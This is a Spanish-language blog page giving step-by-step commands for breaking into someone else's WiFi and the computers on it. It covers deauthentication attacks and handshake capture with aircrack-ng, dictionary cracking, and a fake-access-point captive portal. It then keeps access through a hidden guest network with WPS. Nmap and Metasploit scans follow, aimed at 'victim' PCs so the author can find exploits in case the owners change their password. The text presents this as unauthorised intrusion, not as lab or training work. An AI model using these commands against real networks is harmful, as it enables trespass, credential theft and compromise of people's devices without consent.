<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">service network-manager stop
</span></span><span class="line"><span class="cl">airmon-ng check <span class="nb">kill</span> <span class="c1"># comprobamos que se mató el proceso</span>
</span></span><span class="line"><span class="cl">airmon-ng start wlan1 <span class="c1"># o wlan0 para ponerlo en modo monitor, en modo monitor tu internet dejará de funcionar, salvo que tengas dos antenas wifi.</span>
</span></span><span class="line"><span class="cl">iwconfig
</span></span><span class="line"><span class="cl">airmon-ng stop wlan1mon <span class="c1"># Para detener el modo monitor</span>
</span></span><span class="line"><span class="cl">airodump-ng wlan1mon <span class="c1"># Para escuchar paquetes (tiene que estar en modo monitor) de ahí elegí la mac address de cualquier red para usarla en el siguiente comando.</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Ahora podemos crear una carpeta para guardar el handshake
</span></span><span class="line"><span class="cl"><span class="sb">```</span>console
</span></span><span class="line"><span class="cl">mkdir handshake
</span></span><span class="line"><span class="cl"><span class="nb">cd</span> handshake
</span></span></code></pre></div><h3 id="escuchamos-para-capturar-el-handshake">Escuchamos para capturar el handshake</h3>
<p><code>airodump-ng wlan1mon --bssid 1C:5F:2B:E7:77:EA --channel 11 --write handshake --output-format cap</code></p>
<p>Cuando el handshake es capturado se guardará en el directorio en donde estás situado.</p>
<h3 id="deautenticamos-a-los-clientes-para-que-se-vuelvan-a-conectar-y-así-capturar-el-handshake">Deautenticamos a los clientes para que se vuelvan a conectar y así capturar el handshake.</h3>
<p><code>aireplay-ng --deauth 0 -a 1C:5F:2B:E7:77:EA -c 40:E2:30:CC:1E:8D wlan1mon # donde -a es el SSID y -c es el cliente.</code></p>
<h3 id="una-vez-que-capturamos-el-handshake-intentamos-descubrir-la-contraseña-usando-un-diccionario">Una vez que capturamos el handshake, intentamos descubrir la contraseña usando un diccionario.</h3>
<p><code>aircrack-ng handshake.cap -w passwords.txt</code>
En KaliLinux hay un diccionario muy conocido que se llama rockyou.txt y otros diccionarios que se pueden ver ejecutando el comando <code>wordlists</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">### Detener la captura del handshake:
</span></span><span class="line"><span class="cl">```bash
</span></span><span class="line"><span class="cl">sudo airmon-ng stop wlan1mon (detiene el modo monitor de la wifi)
</span></span><span class="line"><span class="cl">service network-manager start
</span></span></code></pre></div><h3 id="ataque-de-deautenticacion-y-portal-cautivo">Ataque de deautenticacion y portal cautivo.</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo su
</span></span><span class="line"><span class="cl">service network-manager stop
</span></span><span class="line"><span class="cl">airmon-ng check <span class="nb">kill</span>
</span></span><span class="line"><span class="cl">airodump-ng start wlan0mon
</span></span><span class="line"><span class="cl">iwconfig <span class="c1"># Para verificar que nuestra wlan0 esté en monitor mode.</span>
</span></span><span class="line"><span class="cl">airodump-ng wlan0mon
</span></span></code></pre></div><p>Ahora arriba apareceran los SSID y abajo los clientes conectados a esas SSID</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">airodump-ng wlan0mon --bssid direccion_mac_encontrada_con_el_comando_anterior --channel numero_del_canal_encontrado_en_el_comando_anterior
</span></span></code></pre></div><p>Así encontraremos los clientes conectados a esa WiFi.</p>
<p>Ahora los deautenticamos.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">aireplay-ng --deauth <span class="m">0</span> -a 1C:5F:2B:E7:77:EA -c 40:E2:30:CC:1E:8D wlan1mon
</span></span></code></pre></div><p>Ahora ejecutamos nuestro fake-ap-start.sh</p>
<p>Para detenerlo <code>fake-ap-stop.sh</code> y luego service <code>network-manager start</code></p>
<h3 id="una-vez-que-conseguimos-el-acceso-a-la-wifi-no-deberíamos-perderlo-más">Una vez que conseguimos el acceso a la wifi, no deberíamos perderlo más.</h3>
<p>Una técnica para no perder el acceso puede ser levantar una red wifi invitado OCULTA no difundas el SSID (guest network) y habilitar acceso a través de WPS por PIN.</p>
<h2 id="hackeando-computadoras-una-vez-que-conseguiste-el-acceso">Hackeando computadoras una vez que conseguiste el acceso</h2>
<p>Una vez que conseguimos el acceso a la WiFi, estaría bueno tener acceso también a las computadoras por si las dudas en un futuro cambian la contraseña. Para ello utilizaremos metasploit.
Primero hacemos un escaneo de todas las PCs conectadas a esa WiFi con el siguiente comando.</p>
<h3 id="escanea-todas-las-computadoras-conectadas-a-esa-wifi">Escanea todas las computadoras conectadas a esa wifi</h3>
<p><a href="https://archive.is/wip/vBAQq">https://archive.is/wip/vBAQq</a></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap -sP 192.168.1.0/24 <span class="c1"># Generalmente es 192.168.1 pero puede variar mirá tu ip con el comando ip a</span>
</span></span></code></pre></div><h3 id="o-usando-metasploit">O usando metasploit:</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msfconsole
</span></span><span class="line"><span class="cl">msf &gt; use auxiliary/scanner/discovery/arp_sweep
</span></span><span class="line"><span class="cl">msf auxiliary<span class="o">(</span>arp_sweep<span class="o">)</span> &gt; <span class="nb">set</span> RHOSTS 192.168.1.1/24
</span></span></code></pre></div><p>Más información: <a href="https://thelinuxcode.com/scan-vulnerabilities-metasploit/">https://thelinuxcode.com/scan-vulnerabilities-metasploit/</a><br>
Archive: <a href="https://archive.is/wip/JgyL7">https://archive.is/wip/JgyL7</a></p>
<p>Ahora detectemos que sistema operativo están ejecutando esas computadoras (Android, Windows o Linux para poder encontrar una vulnerabilidad para ese sistema operativo)</p>
<p>Existen varios métodos:
<a href="https://archive.is/wbYBK">https://archive.is/wbYBK</a></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap -sS -O IPs_VICTIMAS_SEPARADAS_POR_ESPACIOS
</span></span></code></pre></div><p>O hacé un escaneo masivo usando: <code>$ nmap -T4 -A 192.168.0.0/24</code></p>
<p>Acá tienen una lista de comandos de tipos de escaneos que pueden realizar con nmap:
<a href="https://archive.is/wip/VisbY">https://archive.is/wip/VisbY</a></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> curl cheat.sh/
</span></span><span class="line"><span class="cl"><span class="gp">#</span> Single target scan:
</span></span><span class="line"><span class="cl"><span class="go">nmap [target]
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="gp">#</span> Scan from a list of targets:
</span></span><span class="line"><span class="cl"><span class="go">nmap -iL [list.txt]
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="gp">#</span> iPv6:
</span></span><span class="line"><span class="cl"><span class="go">nmap -6 [target]
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="gp">#</span> OS detection:
</span></span><span class="line"><span class="cl"><span class="go">nmap -O --osscan_guess [target]
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="gp">#</span> Save output to text file:
</span></span><span class="line"><span class="cl"><span class="go">nmap -oN [output.txt] [target]
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="gp">#</span> Save output to xml file:
</span></span><span class="line"><span class="cl"><span class="go">nmap -oX [output.xml] [target]
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="gp">#</span> Scan a specific port:
</span></span><span class="line"><span class="cl"><span class="go">nmap -source-port [port] [target]
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="gp">#</span> Do an aggressive scan:
</span></span><span class="line"><span class="cl"><span class="go">nmap -A [target]
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="gp">#</span> Speedup your scan:
</span></span><span class="line"><span class="cl"><span class="gp">#</span> -n <span class="o">=</span>&gt; disable ReverseDNS
</span></span><span class="line"><span class="cl"><span class="gp">#</span> --min-rate<span class="o">=</span><span class="nv">X</span> <span class="o">=</span>&gt; min X packets / sec
</span></span><span class="line"><span class="cl"><span class="go">nmap -T5 --min-parallelism=50 -n --min-rate=300 [target]
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="gp">#</span> Traceroute:
</span></span><span class="line"><span class="cl"><span class="go">nmap -traceroute [target]
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="gp">#</span> Ping scan only: -sP
</span></span><span class="line"><span class="cl"><span class="gp">#</span> Don<span class="s1">&#39;t ping:     -PN &lt;- Use full if a host don&#39;</span>t reply to a ping.
</span></span><span class="line"><span class="cl"><span class="gp">#</span> TCP SYN ping:   -PS
</span></span><span class="line"><span class="cl"><span class="gp">#</span> TCP ACK ping:   -PA
</span></span><span class="line"><span class="cl"><span class="gp">#</span> UDP ping:       -PU
</span></span><span class="line"><span class="cl"><span class="gp">#</span> ARP ping:       -PR
</span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="gp">#</span> Example: Ping scan all machines on a class C network
</span></span><span class="line"><span class="cl"><span class="go">nmap -sP 192.168.0.0/24
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="gp">#</span> Force TCP scan: -sT
</span></span><span class="line"><span class="cl"><span class="gp">#</span> Force UDP scan: -sU
</span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="gp">#</span> Use some script:
</span></span><span class="line"><span class="cl"><span class="go">nmap --script default,safe
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="gp">#</span> Loads the script in the default category, the banner script, and all .nse files in the directory /home/user/customscripts.
</span></span><span class="line"><span class="cl"><span class="go">nmap --script default,banner,/home/user/customscripts
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="gp">#</span> Loads all scripts whose name starts with http-, such as http-auth and http-open-proxy.
</span></span><span class="line"><span class="cl"><span class="go">nmap --script &#39;http-*&#39;
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="gp">#</span> Loads every script except <span class="k">for</span> those in the intrusive category.
</span></span><span class="line"><span class="cl"><span class="go">nmap --script &#34;not intrusive&#34;
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="gp">#</span> Loads those scripts that are in both the default and safe categories.
</span></span><span class="line"><span class="cl"><span class="go">nmap --script &#34;default and safe&#34;
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="gp">#</span> Loads scripts in the default, safe, or intrusive categories, except <span class="k">for</span> those whose names start with http-.
</span></span><span class="line"><span class="cl"><span class="go">nmap --script &#34;(default or safe or intrusive) and not http-*&#34;
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="gp">#</span> Scan <span class="k">for</span> the heartbleed
</span></span><span class="line"><span class="cl"><span class="gp">#</span> -pT:443 <span class="o">=</span>&gt; Scan only port <span class="m">443</span> with TCP <span class="o">(</span>T:<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="go">nmap -T5 --min-parallelism=50 -n --script &#34;ssl-heartbleed&#34; -pT:443 127.0.0.1
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="gp">#</span> Show all informations <span class="o">(</span>debug mode<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="go">nmap -d ...
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="gp">#</span> Scan <span class="k">for</span> available SSH connections <span class="o">(</span>use root <span class="k">for</span> additional output<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="go">nmap -p 22 192.168.0.0/24
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="gp">#</span><span class="c1"># Port Status Information</span>
</span></span><span class="line"><span class="cl"><span class="go">- Open: This indicates that an application is listening for connections on this port.
</span></span></span><span class="line"><span class="cl"><span class="go">- Closed: This indicates that the probes were received but there is no application listening on this port.
</span></span></span><span class="line"><span class="cl"><span class="go">- Filtered: This indicates that the probes were not received and the state could not be established. It also indicates that the probes are being dropped by some kind of filtering.
</span></span></span><span class="line"><span class="cl"><span class="go">- Unfiltered: This indicates that the probes were received but a state could not be established.
</span></span></span><span class="line"><span class="cl"><span class="go">- Open/Filtered: This indicates that the port was filtered or open but Nmap couldn’t establish the state.
</span></span></span><span class="line"><span class="cl"><span class="go">- Closed/Filtered: This indicates that the port was filtered or closed but Nmap couldn’t establish the state.
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="gp">#</span><span class="c1"># Additional Scan Types</span>
</span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">nmap -sn: Probe only (host discovery, not port scan)
</span></span></span><span class="line"><span class="cl"><span class="go">nmap -sS: SYN Scan
</span></span></span><span class="line"><span class="cl"><span class="go">nmap -sT: TCP Connect Scan
</span></span></span><span class="line"><span class="cl"><span class="go">nmap -sU: UDP Scan
</span></span></span><span class="line"><span class="cl"><span class="go">nmap -sV: Version Scan
</span></span></span><span class="line"><span class="cl"><span class="go">nmap -O: Used for OS Detection/fingerprinting
</span></span></span><span class="line"><span class="cl"><span class="go">nmap --scanflags: Sets custom list of TCP using `URG ACK PSH RST SYN FIN` in any order
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="gp">#</span><span class="c1">## Nmap Scripting Engine Categories</span>
</span></span><span class="line"><span class="cl"><span class="go">The most common Nmap scripting engine categories:
</span></span></span><span class="line"><span class="cl"><span class="go">- auth: Utilize credentials or bypass authentication on target hosts.
</span></span></span><span class="line"><span class="cl"><span class="go">- broadcast: Discover hosts not included on command line by broadcasting on local network.
</span></span></span><span class="line"><span class="cl"><span class="go">- brute: Attempt to guess passwords on target systems, for a variety of protocols, including http, SNMP, IAX, MySQL, VNC, etc.
</span></span></span><span class="line"><span class="cl"><span class="go">- default: Scripts run automatically when -sC or -A are used.
</span></span></span><span class="line"><span class="cl"><span class="go">- discovery: Try to learn more information about target hosts through public sources of information, SNMP, directory services, and more.
</span></span></span><span class="line"><span class="cl"><span class="go">- dos: May cause denial of service conditions in target hosts.
</span></span></span><span class="line"><span class="cl"><span class="go">- exploit: Attempt to exploit target systems.
</span></span></span><span class="line"><span class="cl"><span class="go">- external: Interact with third-party systems not included in target list.
</span></span></span><span class="line"><span class="cl"><span class="go">- fuzzer: Send unexpected input in network protocol fields.
</span></span></span><span class="line"><span class="cl"><span class="go">- intrusive: May crash target, consume excessive resources, or otherwise impact target machines in a malicious fashion.
</span></span></span><span class="line"><span class="cl"><span class="go">- malware: Look for signs of malware infection on the target hosts.
</span></span></span><span class="line"><span class="cl"><span class="go">- safe: Designed not to impact target in a negative fashion.
</span></span></span><span class="line"><span class="cl"><span class="go">- version: Measure the version of software or protocols on the target hosts.
</span></span></span><span class="line"><span class="cl"><span class="go">- vul: Measure whether target systems have a known vulnerability.
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go"> tldr:nmap 
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="gp">#</span> nmap
</span></span><span class="line"><span class="cl"><span class="gp">#</span> Network exploration tool and security / port scanner.
</span></span><span class="line"><span class="cl"><span class="gp">#</span> Some features only activate when Nmap is run with root privileges.
</span></span><span class="line"><span class="cl"><span class="gp">#</span> More information: &lt;https://nmap.org&gt;.
</span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="gp">#</span> Check <span class="k">if</span> an IP address is up, and guess the remote host<span class="err">&#39;</span>s operating system:
</span></span><span class="line"><span class="cl"><span class="go">nmap -O ip_or_hostname
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="gp">#</span> Try to determine whether the specified hosts are up <span class="o">(</span>ping scan<span class="o">)</span> and what their names are:
</span></span><span class="line"><span class="cl"><span class="go">nmap -sn ip_or_hostname optional_another_address
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="gp">#</span> Also <span class="nb">enable</span> scripts, service detection, OS fingerprinting and traceroute:
</span></span><span class="line"><span class="cl"><span class="go">nmap -A address_or_addresses
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="gp">#</span> Scan a specific list of ports <span class="o">(</span>use <span class="s1">&#39;-p-&#39;</span> <span class="k">for</span> all ports from <span class="m">1</span> to 65535<span class="o">)</span>:
</span></span><span class="line"><span class="cl"><span class="go">nmap -p port1,port2,...,portN address_or_addresses
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="gp">#</span> Perform service and version detection of the top <span class="m">1000</span> ports using default NSE scripts<span class="p">;</span> writing results <span class="o">(</span><span class="s1">&#39;-oN&#39;</span><span class="o">)</span> to output file:
</span></span><span class="line"><span class="cl"><span class="go">nmap -sC -sV -oN top-1000-ports.txt address_or_addresses
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="gp">#</span> Scan target<span class="o">(</span>s<span class="o">)</span> carefully using <span class="s1">&#39;default and safe&#39;</span> NSE scripts:
</span></span><span class="line"><span class="cl"><span class="go">nmap --script &#34;default and safe&#34; address_or_addresses
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="gp">#</span> Scan web server running on standard ports <span class="m">80</span> and <span class="m">443</span> using all available <span class="s1">&#39;http-*&#39;</span> NSE scripts:
</span></span><span class="line"><span class="cl"><span class="go">nmap --script &#34;http-*&#34; address_or_addresses -p 80,443
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="gp">#</span> Perform a stealthy very slow scan <span class="o">(</span><span class="s1">&#39;-T0&#39;</span><span class="o">)</span> trying to avoid detection by IDS/IPS and use decoy <span class="o">(</span><span class="s1">&#39;-D&#39;</span><span class="o">)</span> <span class="nb">source</span> IP addresses:
</span></span><span class="line"><span class="cl"><span class="go">nmap -T0 -D decoy1_ipaddress,decoy2_ipaddress,...,decoyN_ipaddress address_or_addresses
</span></span></span></code></pre></div><p>Otro tutorial para detectar el sistema operativo de tu víctima usando metasploit<br>
<a href="https://archive.is/wip/MHXYg">OS fingerprinting with Metasploit</a></p>
<p>Dependiendo del sistema operativo que usen y los puertos abiertos tenemos millones de exploits para elegir. Por torrent usando qbittorrent y jackket también podemos encontrar diferentes técnicas para vulnerar Windows 7/8/10. Una de las vulnerabilidades que recuerdo es en el protocolo SAMBA. En YouTube hay miles de videos (muchos borrados sobre como acceder a computadoras con Windows).</p>
<p>Ejemplo detectar sistema operativo de una PC</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo msfconsole
</span></span><span class="line"><span class="cl">use auxiliary/scanner/portscan/syn
</span></span><span class="line"><span class="cl"><span class="nb">set</span> RHOSTS 192.168.100.28
</span></span><span class="line"><span class="cl"><span class="nb">set</span> threads <span class="m">50</span>
</span></span><span class="line"><span class="cl">show options 
</span></span><span class="line"><span class="cl"><span class="nb">set</span> PORTS <span class="m">445</span> <span class="c1"># opcional</span>
</span></span><span class="line"><span class="cl"><span class="nb">set</span> PORTS 1-65535 <span class="c1"># opcional</span>
</span></span><span class="line"><span class="cl">run
</span></span></code></pre></div><p>Si el puerto 445 está abierto haremos lo siguiente.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">use scanner/smb/smb_version
</span></span><span class="line"><span class="cl"><span class="nb">set</span> RHOSTS 192.168.100.28
</span></span><span class="line"><span class="cl">run
</span></span></code></pre></div><p>Y nos dirá que versión de <strong>Windows</strong> es</p>
<p>O usamos portscan tcp</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo msfconsole
</span></span><span class="line"><span class="cl">use auxiliary/scanner/portscan/tcp
</span></span><span class="line"><span class="cl"><span class="nb">set</span> RHOSTS 192.168.100.28 <span class="c1"># pc victima</span>
</span></span><span class="line"><span class="cl"><span class="nb">set</span> threads <span class="m">20</span>
</span></span><span class="line"><span class="cl">show options 
</span></span><span class="line"><span class="cl"><span class="nb">set</span> PORTS 1-65535 <span class="c1"># opcional</span>
</span></span><span class="line"><span class="cl">run
</span></span></code></pre></div><h3 id="como-usar-metasploit-para-escanear-vulnerabilidades">Como usar metasploit para escanear vulnerabilidades.</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">service postgreqsql start 
</span></span></span><span class="line"><span class="cl"><span class="go">msfdb init
</span></span></span><span class="line"><span class="cl"><span class="go">msfconsole
</span></span></span><span class="line"><span class="cl"><span class="go">db_nmap -v -sV 192.168.0.120
</span></span></span><span class="line"><span class="cl"><span class="go">db_nmap -sS -Pn -A 192.168.0.120
</span></span></span><span class="line"><span class="cl"><span class="go">use scanner/ssh/ssh_version 
</span></span></span><span class="line"><span class="cl"><span class="go">set RHOSTS 192.168.0.120 
</span></span></span><span class="line"><span class="cl"><span class="go">set THREADS 50 
</span></span></span><span class="line"><span class="cl"><span class="go">run
</span></span></span><span class="line"><span class="cl"><span class="go">search name:httpd
</span></span></span></code></pre></div><h3 id="nmap-escanear-por-vulnerabilidades">NMAP Escanear por vulnerabilidades.</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap -Pn --script vuln &lt;&lt;Target_computer_ip_address&gt;&gt;
</span></span></code></pre></div><h3 id="buscamos-vulnerabilidades-con-metasploit">Buscamos vulnerabilidades con metasploit</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">search vuln
</span></span><span class="line"><span class="cl"><span class="c1"># Seleccioná tu vulnerabilidad</span>
</span></span><span class="line"><span class="cl">use auxiliary/scanner/...
</span></span></code></pre></div><h2 id="algunos-otros-escáneres-de-vulnerabilidades-comunes-en-metasploit-son">Algunos otros escáneres de vulnerabilidades comunes en Metasploit son:</h2>
<ol>
<li>Escáneres SMB: busque MS17-010, CVE-2020-0796, etc.
<code>use auxiliary/scanner/smb/smb_ms17_010</code></li>
<li>Escáneres FTP: compruebe si hay vulnerabilidades FTP como la puerta trasera vsftpd. <code>use auxiliary/scanner/ftp/ftp_version</code></li>
<li>Escáneres SMTP: pruebas de autenticación EXIM, problemas de TLS, etc.
<code>use auxiliary/scanner/smtp/smtp_enum</code></li>
<li>Escáneres SSH: detectan algoritmos de cifrado débiles.
<code>use auxiliary/scanner/ssh/ssh_cipher_enum</code></li>
<li>Escáneres de bases de datos: inyección de SQL, credenciales débiles, etc.
<code>use auxiliary/scanner/mssql/mssql_ping</code></li>
</ol>
<p>Acá dejo un tuto:
<a href="https://archive.is/MLuUs">Samba Server Exploitation Using NMAP and Metasploit</a></p>
<h3 id="vulnerá-windows-con-metasploit">Vulnerá Windows con Metasploit</h3>
<p><a href="https://youtube.com/watch?v=y4-oIl6bkbE">https://youtube.com/watch?v=y4-oIl6bkbE</a><br>
<a href="https://youtube.com/watch?v=4PGjyKhYzdY">https://youtube.com/watch?v=4PGjyKhYzdY</a></p>
<h3 id="playlist-sobre-metasploit">Playlist sobre metasploit.</h3>
<p>Y acá una guía de metasploit:
<a href="https://youtube.com/playlist?list=PLBf0hzazHTGN31ZPTzBbk70bohTYT7HSm">https://youtube.com/playlist?list=PLBf0hzazHTGN31ZPTzBbk70bohTYT7HSm</a></p>
<p>Google y YouTube borraron miles de videos de hacking así que pueden buscar tutoriales sobre metasploit también por torrent usando qBittorrent y jackket.</p>
<p>Si capturaron el handshake y tienen una computadora muy lenta lo pueden subir a arg-wireless y le correrán un diccionario.</p>
</div></div><footer>
    <hr>
    <div class="footer-text">
        <div>© 2024 Index</div>
        <div>Powered by <a href="https://gohugo.io/">Hugo</a> & <a
                href="https://github.com/adityatelange/hugo-index/">Index</a></div>
    </div>
</footer>
</body>
</html>
